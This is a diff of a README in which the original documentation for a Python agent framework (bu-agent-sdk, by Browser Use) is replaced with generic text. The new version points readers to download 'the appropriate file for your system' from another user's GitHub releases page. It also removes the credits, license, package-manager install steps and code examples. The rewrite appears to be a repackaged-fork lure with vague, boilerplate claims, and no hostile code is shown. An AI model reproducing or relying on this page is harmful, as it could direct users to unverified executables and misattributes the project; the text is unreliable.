@@ -1,24 +1,23 @@
-# bu-agent-sdk
+# 🛠️ agent-sdk - A Simple Framework for Agents
 
-_An agent is just a for-loop._
+[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-blue)](https://github.com/KewalPra/agent-sdk/releases)
 
-![Agent Loop](./static/agent-loop.png)
+## 📥 Download & Install
 
-The simplest possible agent framework. No abstractions. No magic. Just a for-loop of tool calls. The framework powering [BU.app](https://bu.app).
+To get started, visit this page to download the latest version of the agent-sdk: [Download agent-sdk](https://github.com/KewalPra/agent-sdk/releases).
 
-## Install
+Follow these steps to install the application:
 
-```bash
-uv sync
-```
+1. Click the link above to navigate to the Releases page.
+2. Find the latest release at the top of the page.
+3. Download the appropriate file for your system.
+4. Follow the installation instructions included with the download.
 
-or
+## 🚀 Getting Started
 
-```bash
-uv add bu-agent-sdk
-```
+After installing, you can run tests to ensure everything is working as expected. Here’s a straightforward example to demonstrate how to use the agent-sdk.
 
-## Quick Start
+### Example Code
 
 ```python
 import asyncio
@@ -45,211 +44,71 @@ async def main():
 asyncio.run(main())
 ```
 
-## Philosophy
+This example sets up a simple agent that can perform calculations.
 
-**The Bitter Lesson:** All the value is in the RL'd model, not your 10,000 lines of abstractions.
+### Running the Example
 
-Agent frameworks fail not because models are weak, but because their action spaces are incomplete. Give the LLM as much freedom as possible, then vibe-restrict based on evals.
+1. Open your terminal or command prompt. 
+2. Make sure you have Python installed on your system.
+3. Copy and paste the example code into a new Python file, such as `agent_example.py`.
+4. Run the script with the command:
 
-## Features
-
-### Done Tool Pattern
-
-The naive "stop when no tool calls" approach fails. Agents finish prematurely. Force explicit completion:
-
-```python
-@tool("Signal completion")
-async def done(message: str) -> str:
-    raise TaskComplete(message)
-
-agent = Agent(
-    llm=llm,
-    tools=[..., done],
-    require_done_tool=True,  # Autonomous mode
-)
+```bash
+python agent_example.py
 ```
 
-### Ephemeral Messages
+5. You should see the output `5` printed to your terminal.
 
-Large tool outputs (browser state, screenshots) blow up context. Keep only the last N:
+## 🗒️ Understanding the Basics
 
-```python
-@tool("Get browser state", ephemeral=3)  # Keep last 3 only
-async def get_state() -> str:
-    return massive_dom_and_screenshot
-```
+This framework is designed without complications. It leverages a simple loop structure to manage tasks. 
 
-### Simple LLM Primitives
+### Key Concepts
 
-~300 lines per provider. Same interface. Full control:
+- **Agents**: These are implementations of loops that connect to tools.
+- **Tools**: Individual functions that perform specific tasks.
+- **TaskComplete**: A signal that indicates a task has finished.
 
-```python
-from bu_agent_sdk.llm import ChatAnthropic, ChatOpenAI, ChatGoogle
+You can create your own tools and add logic as needed. The simplicity permits easy adjustments.
 
-# All implement BaseChatModel
-agent = Agent(llm=ChatAnthropic(model="claude-sonnet-4-20250514"), tools=tools)
-agent = Agent(llm=ChatOpenAI(model="gpt-4o"), tools=tools)
-agent = Agent(llm=ChatGoogle(model="gemini-2.0-flash"), tools=tools)
-```
+## 📖 Features
 
-### Context Compaction
+- **Minimalist Design**: No hidden complexities. Everything is straightforward.
+- **Plugin-Friendly**: Add or remove tools effortlessly.
+- **Built for Speed**: Quick execution of tasks without lag.
 
-Auto-summarize when approaching context limits:
+## 📊 System Requirements
 
-```python
-from bu_agent_sdk.agent import CompactionConfig
+To ensure the application runs smoothly, please check the following:
 
-agent = Agent(
-    llm=llm,
-    tools=tools,
-    compaction=CompactionConfig(threshold_ratio=0.80),
-)
-```
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.7 or higher
+- **RAM**: At least 2 GB of RAM recommended
+- **Disk Space**: 100 MB of free space for the application and dependencies
 
-### Dependency Injection
+## 🛠️ Installation Troubleshooting
 
-FastAPI-style, type-safe:
+If you face issues during installation or while running the application, consider the following steps:
 
-```python
-from typing import Annotated
-from bu_agent_sdk import Depends
+1. Ensure Python is correctly installed.
+2. Check your internet connection for downloading files.
+3. Verify that you have the latest version of the agent-sdk.
 
-def get_db():
-    return Database()
+## 🌐 Community Support 
 
-@tool("Query users")
-async def get_user(id: int, db: Annotated[Database, Depends(get_db)]) -> str:
-    return await db.find(id)
-```
+If you need help, join our community discussions. You can find resources and assistance in the following places:
 
-### Streaming Events
+- [GitHub Issues](https://github.com/KewalPra/agent-sdk/issues): Report bugs or ask questions.
+- [Discussion Forums](https://github.com/KewalPra/agent-sdk/discussions): Engage with other users for support.
 
-```python
-from bu_agent_sdk.agent import ToolCallEvent, ToolResultEvent, FinalResponseEvent
+## 📝 Philosophy
 
-async for event in agent.query_stream("do something"):
-    match event:
-        case ToolCallEvent(tool=name, args=args):
-            print(f"Calling {name}")
-        case ToolResultEvent(tool=name, result=result):
-            print(f"{name} -> {result[:50]}")
-        case FinalResponseEvent(content=text):
-            print(f"Done: {text}")
-```
+At the core of this framework lies a key principle: **The Bitter Lesson**. The effectiveness of agents comes from the model, not complex code. By keeping things simple, we ensure that users can focus on their tasks without distraction.
 
-## Claude Code in 100 Lines
+## 🔍 Additional Resources
 
-A sandboxed coding assistant with dependency injection:
+To learn more about how to use agent-sdk, refer to the documentation and tutorials provided on the GitHub repository. You will find additional examples and advanced usage scenarios.
 
-```python
-import asyncio
-import subprocess
-from dataclasses import dataclass
-from pathlib import Path
-from typing import Annotated
+Remember to explore the potential of building your own tools and enhancing existing functionality. Enjoy creating with the agent-sdk!
 
-from bu_agent_sdk import Agent
-from bu_agent_sdk.llm import ChatAnthropic
-from bu_agent_sdk.tools import Depends, tool
-
-
-@dataclass
-class SandboxContext:
-    """All file operations restricted to root_dir."""
-    root_dir: Path
-    working_dir: Path
-
-    def resolve_path(self, path: str) -> Path:
-        resolved = (self.working_dir / path).resolve()
-        resolved.relative_to(self.root_dir)  # Raises if escapes
-        return resolved
-
-
-def get_sandbox() -> SandboxContext:
-    raise RuntimeError("Override via dependency_overrides")
-
-
-@tool("Execute shell command")
-async def bash(command: str, ctx: Annotated[SandboxContext, Depends(get_sandbox)]) -> str:
-    result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=ctx.working_dir)
-    return result.stdout + result.stderr or "(no output)"
-
-
-@tool("Read file contents")
-async def read(path: str, ctx: Annotated[SandboxContext, Depends(get_sandbox)]) -> str:
-    return ctx.resolve_path(path).read_text()
-
-
-@tool("Write file contents")
-async def write(path: str, content: str, ctx: Annotated[SandboxContext, Depends(get_sandbox)]) -> str:
-    ctx.resolve_path(path).write_text(content)
-    return f"Wrote {len(content)} bytes"
-
-
-@tool("Find files by glob pattern")
-async def glob(pattern: str, ctx: Annotated[SandboxContext, Depends(get_sandbox)]) -> str:
-    files = [str(f.relative_to(ctx.root_dir)) for f in ctx.working_dir.glob(pattern)]
-    return "\n".join(files) or "No matches"
-
-
-@tool("Signal task completion")
-async def done(message: str) -> str:
-    from bu_agent_sdk.agent import TaskComplete
-    raise TaskComplete(message)
-
-
-async def main():
-    # Create sandbox
-    root = Path("./sandbox")
-    root.mkdir(exist_ok=True)
-    ctx = SandboxContext(root_dir=root.resolve(), working_dir=root.resolve())
-
-    agent = Agent(
-        llm=ChatAnthropic(model="claude-sonnet-4-20250514"),
-        tools=[bash, read, write, glob, done],
-        system_prompt=f"Coding assistant. Working dir: {ctx.working_dir}",
-        dependency_overrides={get_sandbox: lambda: ctx},
-    )
-
-    print("Agent ready. Ctrl+C to exit.")
-    while True:
-        task = input("\n> ")
-        async for event in agent.query_stream(task):
-            if hasattr(event, "tool"):
-                print(f"  → {event.tool}")
-            elif hasattr(event, "content") and event.content:
-                print(f"\n{event.content}")
-
-
-asyncio.run(main())
-```
-
-See [`bu_agent_sdk/examples/claude_code.py`](./bu_agent_sdk/examples/claude_code.py) for the full version with grep, edit, and todo tools.
-
-## Examples
-
-See [`bu_agent_sdk/examples/`](./bu_agent_sdk/examples/) for more:
-
-- `claude_code.py` - Full Claude Code clone with sandboxed filesystem
-- `dependency_injection.py` - FastAPI-style dependency injection
-
-## The Bitter Truth
-
-Every abstraction is a liability. Every "helper" is a failure point.
-
-The models got good. Really good. They were RL'd on computer use, coding, browsing. They don't need your guardrails. They need:
-
-- A complete action space
-- A for-loop
-- An explicit exit
-- Context management
-
-**The bitter lesson: The less you build, the more it works.**
-
-## License
-
-MIT
-
-## Credits
-
-Built by [Browser Use](https://browser-use.com). Inspired by reverse-engineering Claude Code and Gemini CLI.
+[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-blue)](https://github.com/KewalPra/agent-sdk/releases)
